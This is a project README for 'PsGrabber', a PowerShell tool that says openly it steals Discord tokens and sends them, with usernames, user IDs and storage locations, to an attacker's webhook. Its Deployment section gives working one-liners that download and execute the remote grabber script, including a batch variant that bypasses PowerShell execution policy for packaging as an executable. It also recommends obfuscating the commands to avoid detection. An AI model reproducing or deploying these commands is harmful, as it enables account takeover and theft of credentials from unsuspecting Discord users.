![Logo](https://i.ibb.co/Vtx5jqF/Capture.png)

    
# PsGrabber
A Discord token grabber that exfiltrates tokens to a webhook written in powershell



<details open="open">
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#features">Features</a>
    </li>
    <li>
      <a href="#deployment">Deployment</a>
    </li>
    <li><a href="#acknowledgements">Acknowledgements</a></li>
    <ul>
        <li><a href="#authors">Authors</a></li>
    </ul>
  </ol>
</details>


## Features

- Inbuilt token checker
- All data sent through a webhook
- Provives userID of tokens found
- Provides token type
- Provides the usernames of the tokens stolen
- Gives information on where the tokens stolen are stored

## Deployment

To effectivly deploy this project, choose one of these steps\
To avoid detection, the following commands should be Encoded using [Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)


#### Define HookUrl and use the payload as a powershell script
```powershell
$hookurl='';iex((iwr https://raw.githubusercontent.com/MattOverthrow/PSGrabber/main/PSGrabber.ps1).content)
```

#### Convert to batch and then convert into an exe using a third party program
```batch
powershell.exe -NoProfile -ExecutionPolicy bypass -Command "$hookurl='';iex((iwr https://raw.githubusercontent.com/MattOverthrow/PSGrabber/main/PSGrabber.ps1).content)"
```

## Acknowledgements

 - danielbohannon for The [obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) used in the program
  


## Authors

- [@MattOverthow](https://github.com/MattOverthrow/)
